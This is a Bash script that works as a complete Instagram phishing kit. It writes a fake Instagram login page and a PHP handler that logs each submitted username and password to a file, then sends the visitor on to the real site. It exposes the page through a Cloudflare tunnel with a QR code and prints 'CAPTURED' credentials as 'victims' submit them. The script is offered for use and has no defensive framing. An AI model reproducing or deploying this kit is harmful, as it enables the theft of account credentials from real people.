#!/bin/bash

# ================================================
# --- 0. USER CONFIGURATION (CUSTOM IMAGE) ---
# Yahan apni image ka link dalo jo PC view me dikhani hai
# Agar change karna hai to is link ko replace kar dena
CUSTOM_IMG="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png"
# ================================================


# --- 1. SETUP & QR DEPENDENCIES ---
clear
# Colors
R='\033[1;31m'
G='\033[1;32m'
C='\033[1;36m'
Y='\033[1;33m'
RESET='\033[0m'

# Auto Install QR Tool
if ! command -v qrencode &> /dev/null; then
    echo -e "${Y}[*] Installing QR Code Drivers...${RESET}"
    pkg install libqrencode -y > /dev/null 2>&1
fi

# Cleanup
pkill -f php > /dev/null 2>&1
pkill -f cloudflared > /dev/null 2>&1
rm -rf auth/ cloud.log
mkdir -p auth
touch usernames.txt

# OS Check & Mobile Fix Runner
if [ -d "/data/data/com.termux/files/usr" ]; then
    RUNNER="termux-chroot"
    if ! command -v termux-chroot &> /dev/null; then
        echo -e "${Y}[*] Installing Mobile Fix (Proot)...${RESET}"
        pkg install proot resolv-conf -y > /dev/null 2>&1
    fi
else
    RUNNER=""
fi

# Random Port (Fix for 'Address in use')
PORT=$((3000 + RANDOM % 6000))

# --- 2. HEADER (ANURAG HKR) ---
clear
echo -e "${R}"
cat << "EOF"
   ___  ____  ____    ____  ____   ___  
  / _ \|  _ \|  _ \  |  _ \|  _ \ / _ \ 
 | | | | |_) | |_) | | |_) | |_) | | | |
 | |_| |  _ <|  _ <  |  __/|  _ <| |_| |
  \__\_\_| \_\_| \_\ |_|   |_| \_\\___/ 
                                        
EOF
echo -e "${RESET}"
echo -e "${Y}    >>> ANURAG HKR : QR EDITION v2 <<<    ${RESET}"
echo -e "${C}==========================================${RESET}"
echo ""

# --- 3. HTML GENERATION (WITH CUSTOM IMAGE VARIABLE) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }

/* DESKTOP STYLES */
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }

.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; padding: 20px; }
.card h2{ font-size:20px; margin-bottom:20px; text-align: center; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
.meta{ text-align:center; margin-top:25px; opacity:.7; }

/* MOBILE STYLES */
@media(max-width:900px){
    .main{ flex-direction:column; }
    .left{ display:none; } 
    .right{ width:100%; height:100vh; background:#000; align-items: center; }
    .card{ width: 100%; max-width: 350px; background: transparent; }
    .mobile-logo { display: block; width: 60px; margin: 0 auto 30px auto; }
}
@media(min-width:901px){ .mobile-logo { display: none; } }
</style>
</head>
<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br> your <span>close friends.</span></h1>
        <img class="story" src="$CUSTOM_IMG">
    </div>

    <div class="right">
        <div class="card">
            <img class="mobile-logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
            <h2 style="font-family: sans-serif;">Instagram</h2>
            <form action="login.php" method="POST">
                <input class="input" type="text" name="u" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="p" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">From<br>Meta</div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 5. PHP BACKEND ---
cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "User: " . \$_POST['u'] . " | Pass: " . \$_POST['p'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 6. EXECUTION ---
echo -e "${G}[1] Localhost QR${RESET}"
echo -e "${G}[2] Cloudflare QR (Worldwide)${RESET}"
echo ""
echo -ne "${Y}Select: ${RESET}"
read option

if [[ $option == "1" ]]; then
    echo -e "${Y}[*] Starting Local Server...${RESET}"
    $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
    sleep 2
    
    LINK="http://127.0.0.1:$PORT"
    echo -e "\n${G}[✔] SCAN THIS QR CODE (Local):${RESET}"
    # Generate QR
    qrencode -t ANSIUTF8 "$LINK"
    echo ""
    echo -e "${C}Link: $LINK${RESET}"

elif [[ $option == "2" ]]; then
    # Cloudflare Setup
    if [ ! -f "cloudflared" ]; then
        echo -e "${Y}[*] Downloading Cloudflare Engine...${RESET}"
        ARCH=$(uname -m)
        if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        else
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        fi
        chmod +x cloudflared
    fi

    echo -e "${Y}[*] Starting Tunnel on Port $PORT...${RESET}"
    $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
    sleep 2
    $RUNNER ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
    
    echo -ne "${C}[*] Generating Link & QR... ${RESET}"
    for i in {1..20}; do
        if [ -f cloud.log ]; then
            LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
            if [ ! -z "$LINK" ]; then
                echo -e "\n\n${G}[✔] LINK GENERATED! SCAN NOW:${RESET}"
                echo ""
                # GENERATE QR CODE
                qrencode -t ANSIUTF8 "$LINK"
                echo ""
                echo -e "${Y}URL: $LINK${RESET}"
                break
            fi
        fi
        echo -ne "."
        sleep 2
    done
fi

# --- 7. MONITOR ---
echo ""
echo -e "${R}[*] Waiting for Victim to Scan...${RESET}"
while true; do
    if [ -f usernames.txt ]; then
        tail -n 0 -f usernames.txt | while read line; do
            echo -e "${RED}[!] CAPTURED: ${GREEN}$line${RESET}"
            echo -e "\a"
        done
    fi
done
